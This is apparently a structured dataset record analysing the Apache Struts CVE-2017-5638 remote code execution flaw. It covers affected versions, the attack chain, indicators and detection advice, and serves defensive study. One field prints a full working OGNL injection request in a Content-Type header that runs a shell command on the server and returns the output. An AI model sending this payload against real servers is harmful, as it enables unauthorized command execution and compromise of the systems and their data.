package_info.package_versions: Versions prior to the patched release for CVE-2017-5638 (disclosed March 7, 2017)
package_info.why_malicious: The affected versions of Apache Struts contained a critical remote code execution (RCE) vulnerability (CVE-2017-5638) that allowed attackers to execute arbitrary code on servers running vulnerable Struts applications. This vulnerability was widely exploited, including in the Equifax breach, due to the failure to promptly patch after public disclosure.

execution_context.trigger: At HTTP request processing time, when a request with a crafted Content-Type header is received
execution_context.file_location: org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest (within vulnerable Struts core JARs, e.g., struts2-core-2.3.XX.jar)
required_permissions: filesystem (for file upload handling and potential command execution)
process execution (to run arbitrary commands via OGNL injection)

malicious_snippets.code_snippet:
When a vulnerable Apache Struts application receives an HTTP request with a specially crafted Content-Type header, the Jakarta Multipart parser evaluates the header value as an OGNL expression. If the header contains malicious OGNL code, it is executed in the server context, allowing arbitrary command execution. Example attack request:

POST /struts2-showcase/upload.action HTTP/1.1
Host: victim.com
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}

This triggers OGNL evaluation and command execution.
malicious_snippets.code_language: java (OGNL injection via HTTP request header)
malicious_snippets.code_behavior: At HTTP request processing time, the Jakarta Multipart parser evaluates the Content-Type header as an OGNL expression, allowing attacker-supplied code to execute arbitrary system commands on the server, resulting in remote code execution and potential full system compromise.

malice_analysis.why_suspicious: The code path unsafely evaluates user-supplied HTTP header values as OGNL expressions, directly enabling attackers to inject and execute arbitrary code on the server without authentication.
malice_analysis.violated_expectations: Normally, HTTP headers are treated as untrusted data and never executed as code. The vulnerability violates this expectation by interpreting header values as executable OGNL, leading to remote code execution.
malice_analysis.similar_legitimate_use: OGNL expressions are legitimately used for internal data binding and expression evaluation within Struts, but should never be controllable by external user input such as HTTP headers.
key_indicators: OGNL expression evaluation triggered by Content-Type HTTP header
Presence of OGNL syntax (${...} or %{...}) in HTTP headers
Arbitrary command execution initiated by the web server process in response to HTTP requests
No authentication or authorization required for exploit to succeed

attack_chain.action: Attacker identifies a web application running a vulnerable version of Apache Struts.
Attacker sends a specially crafted HTTP request with a malicious Content-Type header containing OGNL expressions to the vulnerable endpoint.
The vulnerable Jakarta Multipart parser in Struts evaluates the OGNL expression from the Content-Type header, resulting in arbitrary code execution on the server.
Attacker gains remote access to the server, enabling data exfiltration, installation of backdoors, or further lateral movement within the network.
attack_chain.leads_to: Final goal: data breach or system compromise

behavioral_signatures: OGNL expression evaluation triggered by HTTP headers, especially Content-Type
Unexpected process execution (e.g., /bin/bash, cmd.exe) by the web server process
Inbound HTTP requests with Content-Type headers containing OGNL syntax (%{...} or ${...})
Web application logs showing errors or stack traces referencing OGNL or ProcessBuilder
file_indicators: Presence of vulnerable Struts JAR files (e.g., struts2-core-2.3.5.jar, struts2-core-2.3.31.jar) in application deployments
Web server or application logs containing OGNL expressions in HTTP headers
Log entries showing unexpected command execution or output in response to HTTP requests
network_indicators: Inbound HTTP requests with Content-Type headers containing OGNL payloads (e.g., %{...})
Outbound connections from web servers to external IPs or domains following exploitation
Unusual HTTP POST requests to Struts endpoints with multipart/form-data and suspicious Content-Type values
detection_knowledge.how_to_detect: Monitor web server and application logs for HTTP requests with Content-Type headers containing OGNL expressions (e.g., %{...}). Scan deployed applications for vulnerable Struts JAR versions. Use runtime security monitoring to detect unexpected process execution (such as /bin/bash or cmd.exe) by the web server process. Correlate inbound suspicious HTTP requests with subsequent outbound connections or abnormal server behavior to identify exploitation attempts.
